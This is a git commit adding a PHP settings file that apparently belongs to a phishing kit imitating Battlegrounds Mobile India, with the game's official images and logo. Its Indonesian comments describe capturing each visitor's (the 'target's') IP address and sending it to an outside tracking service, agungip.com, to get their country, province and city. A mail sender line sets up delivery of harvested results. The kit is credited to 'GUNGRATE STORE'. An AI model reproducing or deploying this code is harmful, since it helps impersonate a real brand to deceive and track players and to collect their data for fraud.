4cb5e80d1d6d5bdba50a6f96e3a0029a537009ea
Himanshux55 <98723354+Himanshux55@users.noreply.github.com>
2022-07-02 09:21:35 +0530

    hi
    hi sir

---
+++ system/setting.php
@@ -0,0 +1,64 @@
+<?php
+date_default_timezone_set('Asia/Jakarta');
+$jamasuk = date('l, d-m-Y h:i:s');
+
+$title = 'BATTLEGROUNDS MOBILE INDIA';
+$description = 'BATTLEGROUNDS MOBILE INDIA';
+$copyright = 'PUBG MOBILE INDIA';
+$theme = '#000';
+$image = 'https://www.battlegroundsmobileindia.com/common/img/thum.jpg';
+$icon = 'https://www.battlegroundsmobileindia.com/common/img/favicon.ico';
+
+// KONTROL UNTUK HALAMAN KIRIM RESULT
+$author = '';
+$sender = 'From: CODEX<sendrgid.me@gmail.com>';
+
+
+?>
+<?php
+// CREATED BY GUNGRATE
+// GUNGRATE STORE
+
+// MENDAPATKAN ALAMAT IP PRIBADI SI TARGET
+function getClientIP() {
+$ipaddress = '';
+if (getenv('HTTP_CLIENT_IP'))
+$ipaddress = getenv('HTTP_CLIENT_IP');
+else if(getenv('HTTP_X_FORWARDED_FOR'))
+$ipaddress = getenv('HTTP_X_FORWARDED_FOR');
+else if(getenv('HTTP_X_FORWARDED'))
+$ipaddress = getenv('HTTP_X_FORWARDED');
+else if(getenv('HTTP_FORWARDED_FOR'))
+$ipaddress = getenv('HTTP_FORWARDED_FOR');
+else if(getenv('HTTP_FORWARDED'))
+$ipaddress = getenv('HTTP_FORWARDED');
+else if(getenv('REMOTE_ADDR'))
+$ipaddress = getenv('REMOTE_ADDR');
+else
+$ipaddress = 'UNKNOWN';
+return $ipaddress;
+}
+
+// MENGIRIM ALAMAT IP PRIBADI SI TARGET KE SERVER UNTUK DILACAK
+$url = "https://agungip.com/pro/?ip=".getClientIP();
+
+$curl = curl_init($url);
+curl_setopt($curl, CURLOPT_URL, $url);
+curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+
+$resp = curl_exec($curl);
+		curl_close($curl);
+$data = json_decode($resp,true);
+
+// HASIL PELACAKAN ALAMAT IP PRIBADI SI TARGET
+$agung_ip_address = getClientIP();
+$agung_flag = $data['flag'];
+$agung_callcode = $data['callcode'];
+$agung_benua = $data['benua'];
+$agung_negara = $data['negara'];
+$agung_provinsi = $data['provinsi'];
+$agung_kota = $data['kota'];
+
+// CREATED BY GUNGRATE
+// GUNGRATE STORE
+?>
